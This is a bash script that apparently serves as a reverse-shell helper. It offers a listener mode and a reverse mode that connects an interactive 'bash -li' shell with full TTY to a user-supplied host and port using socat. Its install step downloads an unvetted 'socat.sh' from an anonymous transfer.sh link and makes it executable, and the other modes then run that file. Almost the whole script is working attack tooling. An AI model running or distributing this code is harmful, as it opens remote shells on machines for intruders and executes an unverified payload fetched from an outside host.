#!/usr/bin/env bash
# ────  cores ──────

NC='\033[0m'                           
bold=$(tput bold)                         
red="$bold$(tput setaf 1)"                
green=$(tput setaf 2)    

 # ────  cores ──────  
    


 # ────  ascii ──────      


ascii(){
    ./bars
}

instalacao(){
    clear; ascii
    echo -en "[$green 🗸 $NC] Installing socat .."
    wget https://transfer.sh/YMcrb/socat.sh 2>/dev/null
    chmod +x socat.sh
    clear
    ascii
    echo -en "[$green 🗸 $NC] socat has been successfully installed"
    clear
    ascii
}

listener(){
    clear;ascii
    echo -en "[$green 🗸 $NC] put your lport -> "
    sleep 0.5
    read lport
    clear
    ascii
    sleep 2
    echo -en "[$green 🗸 $NC] Waiting for connection .. "
    ./socat.sh file:`tty`,raw,echo=0 tcp-listen:${lport}
}

reverse(){
    clear; ascii
    echo -en "[$green 🗸 $NC] put your lhost -> "
    sleep 0.5
    read lhost
    echo -en "[$green 🗸 $NC] put your lport -> "
    sleep 0.5
    read lport
    clear
    ascii
    echo -en "[$red ! $NC] SET THE LISTENER IN YOUR PERSONAL TERMINAL."
    sleep 4
    clear
    ./socat.sh exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}
    echo -en "[$green 🗸 $NC] check your listener. -> "
}

clear
f=3 b=4
for j in f b; do
  for i in {0..7}; do
    printf -v $j$i %b "\e[${!j}${i}m"
  done
done
bld=$'\e[1m'
rst=$'\e[0m'
inv=$'\e[7m'

cat << EOF
 $bld$f1▬▬▬▬▬ $f2▬▬▬▬▬ $f3▬▬▬▬▬ $f4▬▬▬▬▬ $f5▬▬▬▬▬ $f6▬▬▬▬▬

$f3  https://github.com/march0s1as

 $bld$f1▬▬▬▬▬ $f2▬▬▬▬▬ $f3▬▬▬▬▬ $f4▬▬▬▬▬ $f5▬▬▬▬▬ $f6▬▬▬▬▬   
$rst                                                                               
EOF

case $1 in         
    "-r" | "--reverse")  reverse
         ;;
    "-i" | "--install")  instalacao
         ;;
    "-l" | "--listener") listener
         ;;
   *) echo """-h or --help ------> show this message;
-r or --reverse ---> set the reverse shell with full TTY;
-l or --listener --> set the listener for the full TTY reverse shell.
-i or --install ---> install socat AGAIN."""
      exit 1
      ;;
esac

 # ────  ascii ──────      
